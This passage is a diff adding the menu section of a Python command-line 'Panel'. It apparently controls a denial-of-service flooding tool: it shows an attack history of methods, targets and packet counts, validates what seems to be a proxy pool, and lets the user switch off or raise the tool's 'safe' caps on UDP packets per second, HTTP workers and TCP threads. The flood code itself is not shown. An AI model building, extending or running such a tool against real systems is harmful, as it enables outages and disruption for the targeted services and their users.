+            elif choice=="94":
+                self.pool.validate(100); input(f"{C.D}Enter...{C.END}")
+            elif choice=="91":
+                print(f"\n{C.BOLD} History{C.END}")
+                for h in self.history[-15:]:
+                    print(f"  {h['time']}  {h['method']:<12} {h['target'][:28]:<28} sent={h['sent']:,}")
+                if not self.history: print(f"  {C.D}Empty{C.END}")
+                input(f"{C.D}Enter...{C.END}")
+            elif choice=="92":
+                print(f"\n  {C.BOLD}SOFT AREA CONTROL{C.END}")
+                print(f"  Status : {'ON (capped)' if self.safety.soft_mode else 'OFF (uncapped)'}")
+                print(f"  Caps   : UDP≤{self.safety.SOFT_MAX_PPS} pps | HTTP≤{self.safety.SOFT_MAX_HTTP} | TCP≤{self.safety.SOFT_MAX_TCP}")
+                print(f"  [1] Force OFF  (uncapped)")
+                print(f"  [2] Force ON   (safe caps)")
+                print(f"  [3] Raise caps (soft stays ON)")
+                print(f"  [0] Back")
+                sub = input(f"  {C.Y}choice:{C.END} ").strip()
+                if sub == "1":
+                    self.safety.soft_mode = False
+                    print(f"  {C.R}Soft area OFF — no rate caps{C.END}")
+                elif sub == "2":
+                    self.safety.soft_mode = True
+                    print(f"  {C.G}Soft area ON — caps active{C.END}")
+                elif sub == "3":
+                    self.safety.soft_mode = True
+                    try:
+                        self.safety.SOFT_MAX_PPS = int(input(f"  UDP pps max [{self.safety.SOFT_MAX_PPS}]: ") or self.safety.SOFT_MAX_PPS)
+                        self.safety.SOFT_MAX_HTTP = int(input(f"  HTTP workers [{self.safety.SOFT_MAX_HTTP}]: ") or self.safety.SOFT_MAX_HTTP)
+                        self.safety.SOFT_MAX_TCP = int(input(f"  TCP threads [{self.safety.SOFT_MAX_TCP}]: ") or self.safety.SOFT_MAX_TCP)
+                        self.safety.SOFT_MAX_UDP_TH = min(120, max(8, self.safety.SOFT_MAX_PPS // 40))
+                        print(f"  {C.G}Caps updated{C.END}")
+                    except Exception:
+                        print(f"  {C.R}Invalid number{C.END}")
+                input(f"{C.D}Enter...{C.END}")
+            else:
+                print(f"{C.R}  Invalid{C.END}"); time.sleep(0.3)
+
+if __name__=="__main__":
+    try: Panel().start()
+    except KeyboardInterrupt:
+        print(f"\n{C.D}Interrupted.{C.END}"); sys.exit(0)
